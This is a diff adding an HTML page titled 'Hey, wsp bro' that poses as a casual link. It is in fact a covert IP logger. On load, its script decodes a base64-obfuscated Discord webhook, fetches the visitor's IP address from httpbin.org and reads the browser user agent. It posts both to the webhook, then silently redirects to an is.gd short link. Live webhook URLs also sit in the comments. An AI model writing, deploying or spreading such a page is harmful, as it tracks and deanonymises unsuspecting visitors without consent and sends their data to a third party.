@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>Hey, wsp bro</title>
+</head>
+<body>
+
+
+
+<script>
+  //var wh="https://discord.com/api/webhooks/1356008592549085204/8mHVTo1fzuJi0zYUu4PeHVuK1q933a0yT-533OGkayrJZjC7fCt7LW5lTNYejA-fFr-K";
+//var pb="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4Nzk3MTA1NDU3NTU1NDU5MS9td0hjMmZ4TFZQUHRja0Y1ejNmc19UYXhIZGE3dnNjaWs0QW1iOTl3TWRGVVVGek5sdlpwVmNLRk9DZHpZbGVib1RNWA==";
+var pb="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwNzg0NTMxNjQ3MTgxNjM3NC9XT2sxX1FGYkVKdHY0QU4xNkhFX0hjVnNERkFIUU1HTlQ5ZHFLTE9jeTgxcGFjQVlRMlF2VjU4bVhycDRJU3BpdnQtZQo="  ;
+var wh=atob(pb);
+  setTimeout(async function(){
+const params=new URLSearchParams(window.location.search);
+const gd=params.get("gd");
+var link="https://is.gd/"+gd;
+var ip= await fetch("https://httpbin.org/ip");
+var dt= await ip.json();
+var dt2= dt.origin;
+
+usr=navigator.userAgent;
+msg={
+content: "=======\n\nIP: "+dt2+"\nUser-Agent: "+usr+"\n\nIndo para: "+link
+}
+await fetch(wh,{
+method:"POST",
+headers: {"Content-Type":"application/json"},
+body: JSON.stringify(msg)
+});
+  
+window.location.href=link;
+},1);
+</script>
+</body>
+</html>
